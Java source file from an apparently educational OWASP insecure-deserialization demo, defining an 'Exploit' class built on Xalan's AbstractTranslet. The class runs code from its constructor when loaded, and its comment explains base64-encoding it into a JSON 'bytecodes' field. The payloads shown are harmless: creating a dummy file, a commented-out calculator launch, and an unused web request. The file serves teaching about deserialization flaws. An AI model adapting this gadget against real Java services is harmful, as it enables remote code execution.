package com.doku.doku_owasp_example.insecure_deserialization.model;

import lombok.extern.slf4j.Slf4j;
import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Convert the compiled class of Exploit.java to Base-64 using this command: base64 -i Exploit.class
 * Use this value as the value of "bytecodes" in Simulation3JsonInsecureDeserialization.java
 *
 * @author Daniel Joi Partogi Hutapea
 */
@Slf4j
public class Exploit extends org.apache.xalan.xsltc.runtime.AbstractTranslet
{
    public Exploit() throws Exception
    {
        namesArray = new String[]{"var1"};

        // Enable this line will activate Sophos anti-virus.
        //Runtime.getRuntime().exec("open /System/Applications/Calculator.app");

        //exploitCodeConnectToServer();
        exploitCodeCreateFile();
    }

    private void exploitCodeConnectToServer()
    {
        try
        {
            // Try execute HTTP Request
            StringBuilder result = new StringBuilder();
            //URL url = new URL("http://127.0.0.1:1004");
            URL url = new URL("https://www.google.com?q=test-1");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;

            while ((line = rd.readLine()) != null)
            {
                result.append(line);
            }

            log.info("Server Response: {}", result);
            rd.close();
        }
        catch(Exception ex)
        {
            log.error("Error occurred.", ex);
        }
    }

    @SuppressWarnings("ResultOfMethodCallIgnored")
    private void exploitCodeCreateFile()
    {
        try
        {
            // Try to create an exploit file.
            File file = new File("/Users/daniel/Downloads/exploit-dummy-delete-me.txt");
            file.createNewFile();

            try(BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file))))
            {
                bw.write("exploit-code");
                bw.newLine();
                bw.flush();
            }
        }
        catch(Exception ex)
        {
            log.error("Error occurred.", ex);
        }
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException
    {
    }

    @Override
    public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException
    {
    }
}
